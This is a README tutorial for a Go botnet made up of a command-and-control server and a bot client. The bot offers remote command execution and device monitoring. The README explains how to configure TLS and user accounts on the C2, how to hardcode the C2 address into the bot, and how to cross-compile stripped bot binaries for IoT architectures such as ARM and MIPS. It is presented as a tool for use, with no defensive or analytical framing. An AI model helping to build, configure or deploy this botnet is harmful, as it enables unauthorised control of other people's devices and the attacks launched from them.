# Go Botnet Project - Tutorial

## 1. Project Overview

This project is a botnet developed in Go, consisting of a Command and Control (C2) server and a client-side bot/device. It includes features for remote command execution, device monitoring, and a custom communication protocol. The project also contains utilities for managing content like GIFs for the C2 interface.

### Repository Structure

The project is organized into the following main directories:

```
├── cnc/
│    │            # C2 Server Source Code and Data  
│    ├── main.go    # C2 server entry point
│    ├── memory.go    # Other C2 source files
│    ├── heartbeat.go
│    ├── monitoring.go
│    ├── net_tool.go
│    ├── network.go
│    ├── session.go   # C2 data files (certs, user configs, logs)
│    ├── go.sum
│    ├── go.mod
│    ├── tut.txt
│    └── /data/
│     └── certs
│      ├── geo 
│      ├── gifs
│      ├── json
│      └── logs
│
├── device/             # Bot/Client Source Code
│   ├── bot.go          # Main bot source code
│   ├── build.sh        # Build script for cross-compiling the bot
│   ├── go.sum
│   └── go.mod
│
├── gifs/               # Original GIF files
│
└── gif.py              # Python utility to convert GIFs to a terminal-friendly format
```

---

## 2. The C2 (Command and Control) Server

The C2 server is the central hub for managing and communicating with the bots.

### Prerequisites

- **Go:** Version 1.16 or newer installed and configured.

### Configuration

Before running the C2, you may need to configure:
- **Users:** User accounts and permissions are managed in `cnc/data/json/users.json`.
- **SSL/TLS Certificates:** The server uses TLS for secure communication. Place your `server.crt` and `server.key` in the `cnc/data/certs/` directory.
- **GIFs:** The C2 can display animated GIFs in the terminal. These are stored as `.tfx` files in `cnc/data/gifs/`. Use the `gif.py` utility to create them.

### Building the C2

1.  **Navigate to the C2 directory:**
    ```bash
    cd cnc
    ```

2.  **Initialize Go modules and tidy dependencies:**
    (This may only be needed once or if you have dependency issues.)
    ```bash
    go mod init C2
    go mod tidy
    ```

3.  **Build the executable:**
    This command compiles the source code and creates an executable file (e.g., `c2.exe` on Windows or `c2` on Linux).
    ```bash
    go build .
    ```

### Running the C2

-   **Run the compiled executable:**
    ```bash
    # On Windows
    .\c2.exe

    # On Linux/macOS
    ./c2
    ```

-   **Alternatively, build and run in one step:**
    ```bash
    go run .
    ```

---

## 3. The Bot/Device Client

The bot is the client-side application that connects to the C2 server.

### Prerequisites

- **Go:** Version 1.16 or newer installed for compilation.

### Configuration

**IMPORTANT:** The C2 server address is hardcoded in the bot's source code. Before compiling, you must edit `device/bot.go`:

Find the `main` function at the bottom of the file and change the IP address and port to match your C2 server.

This is planned to be changed for the Bot ID as its currently hardcoded as well for now.

```go
// In device/bot.go
func main() {
    // Change "192.168.0.216:7002" to your C2 server's address
	bot := NewBot("e088c89c39ffec9e", "YOUR_C2_IP_ADDRESS:7002")
	bot.Start()
}
```

### Building the Bot for Multiple Platforms

The `device/build.sh` script is designed to cross-compile the bot for various common Linux architectures used in IoT devices.

1.  **Navigate to the device directory:**
    ```bash
    cd device
    ```

2.  **Make the build script executable (on Linux/macOS):**
    ```bash
    chmod +x build.sh
    ```

3.  **Run the build script:**
    ```bash
    ./build.sh
    ```

This will generate multiple binary files in the `device` directory, each named for its target architecture (e.g., `x86`, `armv7l`, `mips`).

The script runs the following Go commands:
```bash
# For standard 32-bit Linux
GOOS=linux GOARCH=386 go build -ldflags="-s -w" bot.go

# For ARMv7 (e.g., Raspberry Pi 2/3)
GOOS=linux GOARCH=arm GOARM=7 go build -ldflags="-s -w" bot.go

# For ARMv5
GOOS=linux GOARCH=arm GOARM=5 go build -ldflags="-s -w" bot.go

# For 64-bit ARM (e.g., Raspberry Pi 4)
GOOS=linux GOARCH=arm64 go build -ldflags="-s -w" bot.go

# For MIPS architecture
GOOS=linux GOARCH=mips go build -ldflags="-s -w" bot.go

# For MIPS (Little Endian)
GOOS=linux GOARCH=mipsle go build -ldflags="-s -w" bot.go
```

---

## 4. Utilities

### `gif.py` - GIF to TFX Converter

This Python script converts standard `.gif` files into a special `.tfx` format that can be rendered in a terminal, allowing the C2 to display animations.

#### Prerequisites

- **Python 3**
- **Pillow (PIL) Library:** `pip install Pillow`
- **NumPy Library:** `pip install numpy`

#### Usage

Run the script from the root directory of the project.

```bash
python gif.py <input_gif_path> <output_tfx_path>
```

**Example:** To convert `crow.gif` for the C2:
```bash
python gif.py gifs/crow.gif cnc/data/gifs/crow.tfx
```

You can also specify the terminal dimensions for the output:
```bash
python gif.py gifs/Love.gif cnc/data/gifs/love.tfx --width 80 --height 24
```
